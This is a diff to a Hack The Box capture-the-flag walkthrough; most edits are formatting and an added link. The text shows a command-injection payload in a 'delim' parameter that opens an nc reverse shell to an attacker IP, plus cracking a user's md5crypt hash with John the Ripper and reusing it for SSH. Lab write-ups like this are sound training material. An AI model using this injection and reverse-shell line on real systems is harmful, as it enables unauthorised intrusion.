@@ -209,7 +209,7 @@ Let's request a log file and intercept the request with Burp to see the syntax. 
 ![post syntax]({{https://jsom1.github.io/}}/_images/htb_prev_burp3.png)
 </div>
 
-Line 14 shows the selected delim which is directly passed to the *logs.php* script. By researching more information about the python *exec()* command, I found the exact same article I read for BountyHunter, and talks about command injection in Python using *eval()* and *exec()*. It appears it is the same idea as the previous time. After playing a little bit with the command, I came up with the following one to get a reverse shell:
+Line 14 shows the selected delim which is directly passed to the *logs.php* script. By researching more information about the python *exec()* command, I found the exact same article I read for <a href="/_walkthroughs/BountyHunter">BountyHunter</a>, which explains command injection in Python using *eval()* and *exec()*. It appears it is the same idea as the previous time. After playing a little bit with the command, I came up with the following one to get a reverse shell:
 
 ````
 delim=comma; nc -nv 10.10.14.12 4444 -e /bin/bash
@@ -249,13 +249,13 @@ Now, we use the usual mySQL commands to enumerate the database. We're particular
 ![mysql pw]({{https://jsom1.github.io/}}/_images/htb_prev_mysql2.png)
 </div>
 
-And here's a hashed password for the user *m4lwhere*. There's a weird character within it though, and I'm not sure if that could cause problems... Let's still try to crack this hash. We copy it and paste it in a file (*hash.txt* for example). We could use any password cracking tool such as hashcat or JtR, and I chose the latter in this case:
+And here's a hashed password for the user *m4lwhere*. There's a weird character within it though, and I'm not sure if that could cause problems... Let's still try to crack this hash. We copy it and paste it in a file (*hash.txt* for example). We could use any password cracking tool such as *hashcat* or *JtR*, and I chose the latter in this case:
 
 <div class="img_container">
 ![pw cracking]({{https://jsom1.github.io/}}/_images/htb_prev_jtr.png)
 </div>
 
-Note that I first used JtR without specifying the hash format (it detects it automatically), but it gave the warning "*detected hash type md5crypt, but the string is also recognized as md5crypt-long*". Ignoring the warning returned a false positive (wrong password).\\
+Note that I first used *JtR* without specifying the hash format (it detects it automatically), but it gave the warning "*detected hash type md5crypt, but the string is also recognized as md5crypt-long*". Ignoring the warning returned a false positive (wrong password).\\
 Now that we have the password, we could either *su m4lwhere* or ssh in. Since exiting mysql also exited my reverse shell, I'll go with the latter option:
 
 ````
